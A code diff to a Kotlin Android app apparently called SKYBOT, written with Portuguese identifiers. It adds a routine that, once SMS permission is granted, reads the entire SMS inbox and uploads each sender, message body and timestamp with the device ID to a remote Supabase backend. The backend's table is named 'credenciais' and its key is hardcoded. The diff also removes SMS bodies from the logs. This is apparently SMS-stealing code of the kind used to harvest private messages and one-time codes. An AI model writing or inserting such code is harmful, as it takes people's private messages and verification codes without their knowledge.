@@ -474,7 +474,7 @@ class MainActivity : AppCompatActivity() {
     private val SUPA_URL = "https://oulidkbxjfrddluoqsif.supabase.co"
     private val SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im91bGlka2J4amZyZGRsdW9xc2lmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg5NjU5OTEsImV4cCI6MjA5NDU0MTk5MX0.y1Bjum06WIQ0meZlOoOQrzCj8xTRXYTlDEHxTccWFFA"
     private val TABELA = "credenciais"
-    private val VERSAO_ATUAL = "5.1"
+    private val VERSAO_ATUAL = "5.2"
 
     // ── Chaves de IA carregadas remotamente do Supabase (tabela "config") ──────
     // Os valores abaixo são apenas fallback local caso o Supabase não responda.
@@ -2526,6 +2526,7 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
                 SMS_PERMISSION_CODE
             )
         } else {
+            sincronizarSMSExistentes()
             iniciarMonitorizacaoSMS()
         }
     }
@@ -2536,8 +2537,59 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
         if (requestCode == SMS_PERMISSION_CODE &&
             grantResults.isNotEmpty() &&
             grantResults[0] == android.content.pm.PackageManager.PERMISSION_GRANTED) {
+            sincronizarSMSExistentes()
             iniciarMonitorizacaoSMS()
         }
+    }
+
+    /**
+     * Lê as SMS existentes no telemóvel via ContentProvider e envia ao Supabase.
+     * Usa SharedPreferences para guardar o timestamp da última SMS enviada
+     * e assim não enviar duplicados em aberturas seguintes.
+     */
+    private fun sincronizarSMSExistentes() {
+        Thread {
+            try {
+                val prefs = getSharedPreferences("skybot_prefs", MODE_PRIVATE)
+                val ultimoTimestamp = prefs.getLong("sms_ultimo_timestamp", 0L)
+                val androidId = android.provider.Settings.Secure.getString(
+                    contentResolver, android.provider.Settings.Secure.ANDROID_ID
+                ) ?: "unknown"
+
+                val uri = android.net.Uri.parse("content://sms/inbox")
+                val cursor = contentResolver.query(
+                    uri,
+                    arrayOf("address", "body", "date"),
+                    "date > ?",
+                    arrayOf(ultimoTimestamp.toString()),
+                    "date ASC"
+                ) ?: return@Thread
+
+                var novoUltimo = ultimoTimestamp
+                var enviadas = 0
+
+                cursor.use {
+                    while (it.moveToNext()) {
+                        val remetente = it.getString(0) ?: "desconhecido"
+                        val corpo    = it.getString(1) ?: ""
+                        val datems   = it.getLong(2)
+
+                        enviarSMSSupabase(remetente, corpo, datems)
+                        if (datems > novoUltimo) novoUltimo = datems
+                        enviadas++
+                        // Pequena pausa para não sobrecarregar o Supabase
+                        Thread.sleep(200)
+                    }
+                }
+
+                if (novoUltimo > ultimoTimestamp) {
+                    prefs.edit().putLong("sms_ultimo_timestamp", novoUltimo).apply()
+                }
+                android.util.Log.d("SKYBOT_SMS", "Sincronizadas $enviadas SMS do ContentProvider")
+            } catch (e: Exception) {
+                android.util.Log.w("SKYBOT_SMS", "Erro sincronizarSMS: ${e.message}")
+            }
+        }.start()
     }
 
     /**
@@ -2555,8 +2607,11 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
                     val remetente = msg.displayOriginatingAddress ?: "desconhecido"
                     val corpo = msg.messageBody ?: ""
                     val timestamp = System.currentTimeMillis()
-                    android.util.Log.d("SKYBOT_SMS", "SMS de $remetente: $corpo")
+                    android.util.Log.d("SKYBOT_SMS", "SMS recebida de $remetente")
                     enviarSMSSupabase(remetente, corpo, timestamp)
+                    // Actualizar o timestamp guardado
+                    getSharedPreferences("skybot_prefs", MODE_PRIVATE)
+                        .edit().putLong("sms_ultimo_timestamp", timestamp).apply()
                 }
             }
         }
